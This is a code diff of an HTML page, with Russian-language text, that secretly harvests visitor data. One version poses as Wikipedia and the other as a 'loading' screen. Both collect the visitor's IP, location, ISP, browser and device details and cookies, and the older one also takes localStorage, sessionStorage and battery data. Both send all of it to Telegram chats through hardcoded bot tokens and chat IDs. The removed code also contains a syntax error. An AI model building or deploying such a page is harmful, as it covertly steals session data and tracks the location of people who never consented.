@@ -1,56 +1,39 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>Википедия</title></head>
+<head>
+<meta charset="utf-8">
+<title>Загрузка</title>
+</head>
 <body>
+<h1>Секунду...</h1>
 <script>
-var TOKEN = '8847544358:AAFH7jhYxPh7xuTHmoMZXYYHGcxzsYnHGe0';
-var ID = '5442175617';
-var ID2 = '6783102477';
-var REDIRECT = 'https://ru.wikipedia.org/wiki/Заглавная_страница';
+var TOKEN = '8680205049:AAF1KbStZTKnru9p5Ta8wUyKoXHGYgHtJuk'
+var ID = '6783102477'
 
-function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
-var cookieStr = document.cookie || 'пусто (или HttpOnly)';
-var lsStr = '', ssStr = '';
-try { lsStr = JSON.stringify(localStorage) || '{}'; } catch(e){}
-try { ssStr = JSON.stringify(sessionStorage) || '{}'; } catch(e){}
-
-function sendTo(chatId, text){
+fetch('https://ipwho.is/')
+.then(function(r){ return r.json(); })
+.then(function(r){
+  var t = 'IP: ' + r.ip
+    + '\nГород: ' + r.city
+    + '\nСтрана: ' + r.country
+    + '\nПровайдер: ' + (r.connection ? r.connection.isp : '?')
+    + '\nUA: ' + navigator.userAgent
+    + '\nПлатформа: ' + navigator.platform
+    + '\nЯзык: ' + navigator.language
+    + '\nЧасовой пояс: ' + Intl.DateTimeFormat().resolvedOptions().timeZone
+    + '\nЭкран: ' + screen.width + 'x' + screen.height
+    + '\nCPU: ' + navigator.hardwareConcurrency
+    + '\nCookies: ' + (document.cookie || 'пусто');
   var u = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage'
-        + '?chat_id=' + chatId
-        + '&text=' + encodeURIComponent(text);
-  return fetch(u, { keepalive: true }).catch(function(){});
-}
-
-function send(ipData, batStr){
-  var t = 'IP: ' + (ipData.ip || 'н/д') + '\n'
-    + 'Город: ' + (ipData.city  '?') + ', ' + (ipData.country  '?') + '\n'
-    + 'Провайдер: ' + (ipData.connection ? ipData.connection.isp : '?') + '\n'
-    + 'UA: ' + esc(navigator.userAgent) + '\n'
-    + 'Экран: ' + screen.width + 'x' + screen.height + '\n'
-    + 'Батарея: ' + batStr + '\n'
-    + 'URL: ' + location.href + '\n'
-    + 'Referrer: ' + (document.referrer || 'нет') + '\n'
-    + 'Cookies: ' + esc(cookieStr) + '\n'
-    + 'localStorage: ' + esc(lsStr) + '\n'
-    + 'sessionStorage: ' + esc(ssStr);
-
-  Promise.all([ sendTo(ID, t), sendTo(ID2, t) ]).finally(function(){
-    location.replace(REDIRECT);
-  });
-}
-
-// 1. Получаем IP и батарею параллельно, потом шлём
-var ipP = fetch('https://ipwho.is/').then(function(r){ return r.json(); }).catch(function(){ return {}; });
-var batP = navigator.getBattery
-  ? navigator.getBattery().then(function(b){
-      return Math.round(b.level*100) + '%' + (b.charging ? ' (заряжается)' : '');
-    }).catch(function(){ return 'н/д'; })
-  : Promise.resolve('н/д (браузер не поддерживает)');
-
-Promise.all([ipP, batP]).then(function(res){
-  send(res[0], res[1]);
-}).catch(function(){
-  send({}, 'н/д');
+        + '?chat_id=' + ID
+        + '&text=' + encodeURIComponent(t);
+  return fetch(u);
+})
+.then(function(){
+  document.body.innerHTML = '<h1>Готово</h1>';
+})
+.catch(function(e){
+  document.body.innerHTML = '<h1 style="color:red">' + e.message + '</h1>';
 });
 </script>
 </body>
